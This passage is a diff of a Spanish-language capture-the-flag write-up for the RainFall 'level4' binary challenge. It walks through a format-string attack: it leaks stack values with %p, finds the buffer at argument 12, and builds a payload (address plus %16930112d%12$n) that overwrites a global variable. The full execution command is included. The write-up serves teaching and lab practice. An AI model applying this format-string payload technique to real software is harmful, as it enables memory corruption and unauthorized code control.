@@ -40,7 +40,7 @@ level4@RainFall:~$ readelf -l ./level4 | grep -E "STACK|RELRO"
 
 ### d). STACK CANARY:
 ```bash
-level3@RainFall:~$ nm ./level4 
+level4@RainFall:~$ nm ./level4 
 bash: /usr/bin/nm: Input/output error
 ```
 
@@ -122,27 +122,27 @@ Para ver con detalle el analisis consuta el archivo  [asm_analysis.md](https://g
 0x08048450 <+12>:	call   0x8048340 <printf@plt>         ; printea lo que recibe.
 ```
 
-3. **Objetivo:**
+3. **Identificando Objetivos:**
 
 Nuestro objetivo es modificar la variable global `m` (la que se compara con `0x1025544`) reside en `0x08049810` para que valga `0x1025544` (16930116).
 
 4. **Cálculo del Offset:**
 
-```
+```bash
 level4@RainFall:~$ ./level4
 AAAA %p %p %p %p %p %p %p %p %p %p %p %p %p %p 
 AAAA 0xb7ff26b0 0xbffff794 0xb7fd0ff4 (nil) (nil) 0xbffff758 0x804848d 0xbffff550 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x20702520 0x25207025 
 level4@RainFall:~$ 
 ```
-Al introducir `AAAA` seguido de múltiples `%p`, observamos que el valor hexadecimal `0x41414141` aparece en la posición **12**. Esto nos confirma que nuestro buffer comienza a ser leído por `printf` a partir del duodécimo argumento en el stack.
+Al introducir `AAAA` seguido de múltiples `%p`, observamos que el valor hexadecimal (`0x41414141`) aparece en la posición **12**. Esto nos confirma que nuestro buffer comienza a ser leído por `printf` a partir del duodécimo argumento en el stack.
 
 5. **Construcción del Payload:**
 
 - **\x10\x98\x04\x08:** Escribimos la dirección destino al principio. Ocupa 4 bytes.
 - **%16930112d:** Forzamos a `printf` a imprimir una cantidad masiva de caracteres. 16930116(objetivo) −4 (ya escritos) = 16930112.
-- **%12$n:** Le decimos a `printf`: "Toma el total de caracteres escritos hasta ahora e inyéctalo en la dirección apuntada por el 12º argumento del stack". Como el 12º argumento es el inicio de nuestro buffer, contiene la dirección 0x08049810.
+- **%12\$n:** Le decimos a `printf`: "Este es el total de caracteres escritos hasta ahora e inyéctalo en la dirección apuntada por el 12º argumento del stack". Como el 12º argumento es el inicio de nuestro buffer, contiene la dirección 0x08049810.
 
-### ** Ejecución**
+### **Ejecución:**
 
 ```bash
 level4@RainFall:~$ (printf "\x10\x98\x04\x08"; printf "%%16930112d%%12\$n"; cat) | ./level4
